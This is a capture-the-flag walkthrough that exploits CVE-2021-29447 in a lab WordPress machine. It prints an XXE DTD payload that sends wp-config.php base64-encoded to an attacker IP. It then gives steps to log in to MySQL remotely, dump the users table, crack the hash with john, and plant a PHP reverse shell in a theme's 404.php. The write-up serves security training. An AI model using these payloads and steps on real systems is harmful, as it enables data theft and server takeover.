# Wordpress: CVE-2021-29447
---

## INDEX

* [Task-1, Task-2 and Task-3](#task-1-task-2-and-task-3)
* [Task-4, Task-5 and Task-6](#task-4-task-5-and-task-6)
* [Task-7 and Task-8](#task-7-and-task-8)
* [Task-9](#task-9)
---


Using username: `test-corp` and password: `test` we can login on *wp-login.php* page.


## Task-1, Task-2 and Task-3

**Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.**
**Based on the results of #1, what is the name of the database for WordPress?**
**Based on the results of #1, what are the credentials you found?**

Following the tutorial in **part-1** of the machine follow the steps all the wav. Just make sure to change the filename in .dtd file. In this case its *wp-config.php*

```php
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.9.8.235:9999/?p=%file;'>" >
```

Once the received encoded text is decoded just read the file and **Task-2** and **Task-3** can be completed.

## Task-4, Task-5 and Task-6

**Enumerate and identify what is the dbms installed on the server?**
**Based on the results of #4, what is the dbms version installed on the server?**
**Based on the results of #4, what port is the dbms running on?**

```bash
$ nmap -sV -oN nmap-scan 10.10.40.250

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap scan result it is clearly `MySQL` with version `5.7.33` on port `3306`

## Task-7 and Task-8

**Compromise the dbms, What is the encrypted password located in the wordpress  users table with id 1?**
**Based on the results of #7, What is the password in plain text?**

In order to connect to remote mysql server use the following command with the correct password obtained from *wp-config.php* file

```bash
mysql -h 10.10.40.250 -u thedarktangent -p
```

Once in just using the following commands will give the answers to the **Task-7** and **Task-8**

```bash
show databases;
use wordpressdb2;
show tables;
select * from wptry_users
```

Just create a file named *hash* with hash of password obtained from sql table and run `john` on it.

```bash
john --wordlist=../rockyou.txt hash
```

## Task-9

**Compromise the machine and locate flag.txt**

Just login as `corp-001` with the cracked password and navigate to *theme editor* under *Appearances*. Just select a theme which is currently not in use *(I went with twenty twenty)*.

Edit the *404.php* file to include just a php reverse shell, so anytime it is called it will just give a callback to attacker's machine. Once done navigate to the *theme* under *Appearances* and activate the theme just edited (twenty twenty in my case).

Start the netcat listner `nc -lvnp <port>`. Now just delibrately try to cause a 404 error. Once done check the netcat for reverse shell. Just navigate to */home/stux/flag/flag.txt* to get the last flag.
